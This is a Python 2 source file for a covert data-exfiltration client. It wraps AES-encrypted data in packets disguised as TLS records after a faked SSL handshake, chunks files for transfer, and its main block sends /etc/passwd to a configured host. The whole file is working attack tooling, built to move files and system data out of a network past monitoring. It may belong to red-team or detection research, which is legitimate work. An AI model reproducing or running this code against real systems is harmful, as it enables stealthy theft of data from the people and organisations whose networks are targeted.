
import ssl
import sys
import time
import socket
import hashlib
import urllib2

from Crypto import Random
from Crypto.Cipher import AES

from itertools import izip_longest

# Setting timeout so that we won't wait forever
timeout = 2
socket.setdefaulttimeout(timeout)


def chunkstring(s, n):
    return [ s[i:i+n] for i in xrange(0, len(s), n) ]

class AESCipher(object):

    def __init__(self, key):
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        # enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]


class HTTPSExfiltrationClient():

    def __init__(self, host, key, port=443, max_size=8192):
        self.host = host
        self.port = port
        self.max_size = max_size
        self.AESDriver = AESCipher(key=key)

        self.sock = None

        # Initiate the socket
        check = self._pretendSSL()
        if check is not 0:
            sys.exit(1)
        check = self._createRealSocket()
        if check is not 0:
            sys.exit(1)


    def _pretendSSL(self):
        try:
            response = urllib2.urlopen('https://%s:%s/' % (self.host, self.port))
            html = response.read()
        except urllib2.URLError, e:
            return 0
        except socket.error as e:
            sys.stderr.write("[!]\tCould not reach server to fake SSL handshake!\n")
            return 1
        except ssl.CertificateError:
            # Certificates does not match
            return 0


    def _createRealSocket(self):
        try:
            sock = socket.socket()
            sock.connect((self.host, self.port))
            self.sock = sock
            return 0
        except socket.error as e:
            sys.stderr.write("[!]\tCould not setup a connection to %s. Error:\n%s.\n" % (self.host, e))
            return 1


    def sendData(self, data):
        time.sleep(0.2)
        if self._createRealSocket() is 1:
            return 1

        dat = self.AESDriver.encrypt(data)

        try:
            packet_length = chr(len(dat))
        except ValueError:
            sys.stderr.write("[-]\tData is too long to send.\n")
            return 1

        if len(packet_length) == 1:
            packet_length = "\x00" + packet_length
        elif len(packet_length) == 2:
            pass
        else:
            sys.stderr.write("[!]\tPacket is too big.\n")
            return 1

        pckt = "\x17\x03\x03"+packet_length+dat
        self.sock.send(pckt)
        self.sock.close()
        sys.stdout.write("[.]\tSent '%s/%s'.\n" % (len(dat), len(pckt)))
        return 0

    def _roundItUp(self, my_int):

        try:
            as_char = chr(my_int)
        except ValueError:
            return 1

        if len(as_char) == 0:
            return "\x00\x00"

        elif len(as_char) == 1:
            return "\x00" + as_char

        elif len(as_char) == 2:
            return as_char

        else:
            return 1


    def sendFile(self, file_path):

        # Read the file
        try:
            f = open(file_path, 'rb')
            data = f.read()
            f.close()
            sys.stdout.write("[+]\tFile '%s' was loaded for exfiltration.\n" % file_path)
        except IOError, e:
            sys.stderr.write("[-]\tUnable to read file '%s'.\n%s.\n" % (file_path, e))
            return 1

        if len(data) < self.max_size -9:
            enc_data = self.AESDriver.encrypt(data)
            chunk_len = "\x00\x00"
            self.sock.send("\x17\x03\x03" + chunk_len + "\x00\x01" + "\x00\x01" + enc_data)
            sys.stdout.write("[+]\tSent file in one chunk.\n")
            return 0

        # Split into chunks by max size
        chunks = chunkstring(data, self.max_size-9)

        # Build Chunks in Order:
        transmit_blocks = []
        blocks_count = self._roundItUp(len(chunks))
        i = 0

        for chunk in chunks:
            i += 1
            enc_data = self.AESDriver.encrypt(chunk)
            chunk_len = self._roundItUp(len(enc_data))
            this_packet = self._roundItUp(i)

            if chunk_len == 1:
                # No data to encode
                pass

            else:
                this = "\x17\x03\x03" + chunk_len + this_packet + blocks_count + enc_data
                transmit_blocks.append(this)

        # Send the data
        i = 0
        for block in transmit_blocks:
            i += 1
            sys.stdout.write("[.]\tSending block %s/%s - len(%s).\n" % (i, len(transmit_blocks), len(block)-9))
            try:
                self.sock.send(block)
            except:
                self._createRealSocket()
                self.sock.send(block)
            time.sleep(0.2)
        return 0


    def close(self):
        self._createRealSocket()
        time.sleep(0.1)
        self.sock.send("\x17\x03\x03\x16\x05\x16")
        self.sock.close()
        return 0


if __name__ == "__main__":
    client = HTTPSExfiltrationClient(host='127.0.0.1', key="123")

    # Sending a string
    # client.sendData("google is not my name")
    #
    # # Sending a file the bad way
    # try:
    #     f = open('/etc/passwd', 'r')
    #     data = f.read()
    #     f.close()
    #     client.sendData(data)
    # except:
    #     pass

    # Sending a file the right way
    client.sendFile("/etc/passwd")
    client.close()
